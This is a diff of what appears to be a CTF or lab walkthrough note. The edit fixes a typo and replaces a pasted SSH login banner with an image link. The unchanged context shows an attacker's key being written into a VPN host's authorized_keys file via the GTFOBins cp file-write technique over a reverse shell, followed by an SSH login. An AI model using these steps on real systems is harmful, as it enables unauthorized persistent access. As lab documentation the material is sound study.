@@ -52,7 +52,7 @@ From https://gtfobins.github.io/gtfobins/cp/
 
 
 ## Drop this key into the VPN's authorized_keys file
-Following the instruccions from  File Write section run the commands on the reverse shell to drop the key into the VPN's authorized_keys file.
+Following the instructions from  File Write section run the commands on the reverse shell to drop the key into the VPN's authorized_keys file.
 
 
 `LFILE=/home/ubuntu/.ssh/authorized_keys`
@@ -63,36 +63,7 @@ Following the instruccions from  File Write section run the commands on the reve
 
 $  `ssh ubuntu@10.200.10.12 -i rsa`
 
-
-The authenticity of host '10.200.10.12 (10.200.10.12)' can't be established.
-ED25519 key fingerprint is SHA256:VNkFkNLPumSiOW8qgun9K81FptOl/QPenkQylHqjNPU.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.200.10.12' (ED25519) to the list of known hosts.
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-1101-aws x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun Mar 10 10:42:32 UTC 2024
-
-  System load:  0.0               Processes:           115
-  Usage of /:   49.6% of 7.68GB   Users logged in:     0
-  Memory usage: 19%               IP address for ens5: 10.200.10.12
-  Swap usage:   0%                IP address for tun0: 12.100.1.1
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-72 packages can be updated.
-1 update is a security update.
-
-
-Last login: Thu May  4 17:53:22 2023 from 102.132.177.54
-<font color="#00b050">ubuntu@ip-10-200-10-12:~$</font>
+![[Connect via SSH (10.200.X.12)-20240704145204304.webp]]
 
 ## Getting root
 
